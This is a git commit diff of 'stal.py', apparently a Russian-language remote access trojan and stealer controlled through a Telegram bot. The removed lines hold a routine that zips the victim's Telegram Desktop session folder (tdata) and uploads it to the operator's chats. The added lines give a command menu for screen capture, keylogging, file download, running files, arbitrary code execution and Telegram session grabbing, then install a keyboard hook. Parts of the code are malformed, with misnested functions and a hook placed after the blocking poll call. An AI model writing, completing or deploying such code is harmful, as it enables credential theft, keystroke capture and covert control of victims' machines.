c8dbaeb23517e4027307aeb82bf588c3ca320846
vovanskaie <136624664+vovanskaie@users.noreply.github.com>
2024-03-18 20:52:24 +0300

    Update stal.py

--- stal.py
+++ stal.py
@@ -1,3 +1,4 @@
+code_to_execute = ''
 def send_message_to_group(chat_id, screenshot):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
     data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
@@ -56,60 +57,31 @@ def archive_and_send():
 @bot.message_handler(commands=['tg_grab'])
 def handle_archive_and_send(message):
     chat_id = message.chat.id
-    def send_message_to_group(chat_id, screenshot):
-    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
-    data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
-    image_buffer = BytesIO()
-    screenshot.save(image_buffer, format='JPEG')
-    image_buffer.seek(0)
-    files = {'photo': ('screenshot.jpg', image_buffer)}
-    response = requests.post(url, data=data, files=files)
-def send_file_to_telegram(file_path, file_name):
-    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
-    for chat_id in chat_ids:
-        files = {'document': (file_name, open(file_path, 'rb'))}
-        data = {'chat_id': chat_id}
-        response = requests.post(url, files=files, data=data)
-        if response.status_code != 200:
-            bot.send_message(chat_id, 'ОШИБКА БРАТИШ ХЗ ПОПРОБУЙ ЕЩЕ')
-            print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
-            print(response.text)
-def create_zip_archive(source_dir, output_zip):
-    try:
-        with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
-            pass  # Создаем пустой архив для начала
-        with zipfile.ZipFile(output_zip + '.zip', 'a') as zipf:  # Открываем архив для добавления файлов
-            for root, _, files in os.walk(source_dir):
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    if "user_data" in file_path or "webview" in file_path or "temp" in file_path or "emoji" in file_path or "shortcuts-default.json" in file_path or "working" in file_path:
-                        continue
-                    try:
-                        zipf.write(file_path, os.path.relpath(file_path, source_dir))
-                    except Exception as e:
-                        print(f"Error adding file to zip: {str(e)}")
-        return output_zip + '.zip'
-    except Exception as e:
-        print(f"Error creating zip archive: {str(e)}")
-        return None
-    def archive_and_send():
-        user = os.path.expanduser("~")
-        if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
-            try:
-                source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
-                temp_dir = os.path.join(os.getcwd(), 'temp')
-                if not os.path.exists(temp_dir):
-                    os.makedirs(temp_dir)  # Создаем папку, если её нет
-                output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
-    
-                created_zip = create_zip_archive(source_dir, output_zip)
-                if created_zip:
-                    send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
-                else:
-                    print("Failed to create or send zip file.")
-            except Exception as e:
-                print(f"Error creating or sending zip file: {str(e)}")
-        else:
-            print("Папка 'tdata' не найдена.")
     archive_and_send()
     bot.send_message(chat_id, "Архивация и отправка файла завершены.")
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    chat_id = message.chat.id
+    markup = types.ReplyKeyboardMarkup(row_width=1)
+    itembtn1 = types.KeyboardButton('/capture_pc')
+    itembtn2 = types.KeyboardButton('/keylogs')
+    itembtn3 = types.KeyboardButton('/pc_info')
+    itembtn4 = types.KeyboardButton('/msg_box')
+    itembtn5 = types.KeyboardButton('/ip_info')
+    itembtn6 = types.KeyboardButton('/download_file')
+    itembtn7 = types.KeyboardButton('/list_dir')
+    itembtn8 = types.KeyboardButton('/run_file')
+    itembtn9 = types.KeyboardButton('/tg_grab')
+    itembtn10 = types.KeyboardButton('/url')
+    itembtn11 = types.KeyboardButton('/code')
+    markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
+    bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
+
+
+print('СЛУШАЮ КОМАНДЫ...')
+bot.polling()
+proc = pyHook.HookManager()
+proc.KeyDown = pressed_chars
+proc.HookKeyboard()
+pythoncom.PumpMessages()
